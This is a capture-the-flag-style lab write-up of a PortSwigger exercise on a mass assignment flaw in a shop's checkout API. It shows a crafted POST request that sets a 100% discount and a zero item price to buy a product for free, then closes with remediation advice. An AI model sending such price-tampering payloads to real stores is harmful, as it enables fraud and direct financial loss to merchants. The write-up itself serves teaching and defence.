---
title: Exploiting a Mass Assignment Vulnerability - Business Logic Vulnerability
date: 2026-03-26 00:00:00 +0800
categories: [Business Logic Vulnerabilities, API Security]
tags: [Mass Assignment, API Security, Business Logic, Practitioner, Burp Suite]
---

## Lab Overview

This lab demonstrates a **Mass Assignment Vulnerability** where the application unintentionally allows users to modify hidden or sensitive parameters through API requests.

The backend API accepts JSON input and automatically maps user-supplied fields to internal objects without proper validation or filtering.

**Lab URL:** https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

**Goal:** Exploit the vulnerability to apply a discount and purchase the **"Lightweight l33t Leather Jacket"** for free.

---

## Vulnerability Explanation

The vulnerability arises due to **Mass Assignment**, where the server blindly trusts and binds all user-provided JSON fields to backend objects.

In this case:
- The API exposes a hidden parameter: `chosen_discount`
- This parameter is not meant to be user-controlled
- However, the server accepts and processes it when supplied in the request

This allows attackers to:
- Inject arbitrary discount values
- Manipulate product pricing

---

## My Approach

### Step 1 – Login and Initial Exploration
I logged in using the provided credentials:

- **Username:** `wiener`  
- **Password:** `peter`

I added the **"Lightweight l33t Leather Jacket"** to my cart and proceeded to the checkout page.

---

### Step 2 – Observing API Request
While on the checkout page, I intercepted the request:

```http
GET /api/checkout HTTP/2
````

The response contained structured JSON:

```json
{
  "chosen_discount": { "percentage": 0 },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```

This revealed a hidden parameter:

* `chosen_discount`

---

### Step 3 – Identifying the Attack Surface

The presence of `chosen_discount` suggested:

* The backend uses this field internally
* It might be possible to override it via user input

I sent the request to **Burp Suite Repeater** for further testing.

---

### Step 4 – Checking Allowed Methods

I used the `OPTIONS` method and observed that:

* `GET` and `POST` methods were allowed

This indicated that the endpoint might accept user input via POST.

---

### Step 5 – Switching to POST Request

I modified the request:

* Changed method to `POST`
* Added header:

```
Content-Type: application/json
```

I initially sent an empty JSON body and received an error, confirming that structured input is required.

---

### Step 6 – Crafting Malicious Payload

I crafted a JSON payload to exploit mass assignment:

```
POST /api/checkout HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/json

{
  "chosen_discount": { "percentage": 100 },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 0
    }
  ]
}
```

---

### Step 7 – Successful Exploit

The server accepted the request and applied:

* **100% discount**
* Product price effectively reduced to **$0**

This confirmed that the backend was:

* Accepting user-controlled `chosen_discount`
* Not validating or restricting sensitive fields

---

### Step 8 – Completing the Lab

I returned to the application and placed the order.

Since the total cost was now **$0**, the purchase was successful, and the lab was solved.

---

## Intuition

The secure logic should be:

> Users can only submit allowed fields (e.g., product ID, quantity), while sensitive fields like discounts are controlled exclusively by the server.*

However, the vulnerable logic was:

> Server accepts all fields from user input and blindly maps them to internal objects.*

This leads to a critical issue:

* Attackers can modify hidden parameters
* Internal logic becomes externally controllable

---

## Tools Used

* **Burp Suite (Intercept & Repeater)**
* **Browser Developer Tools**

---

## Vulnerability Category

**Business Logic Vulnerabilities**

This specifically falls under:

* **Mass Assignment**
* **Broken Access Control**
* **Improper Input Validation**

---

## Key Takeaway

Never bind user input directly to internal objects without filtering.

Developers must:

* Use allowlists for accepted parameters
* Ignore or reject unexpected fields
* Protect sensitive attributes (e.g., discounts, roles, pricing)

---

## Impact

The impact is severe:

* Attackers can apply arbitrary discounts
* Leads to direct financial loss
* Can be automated to exploit multiple transactions

In real-world applications, this could allow attackers to purchase any product for free or manipulate pricing at scale.
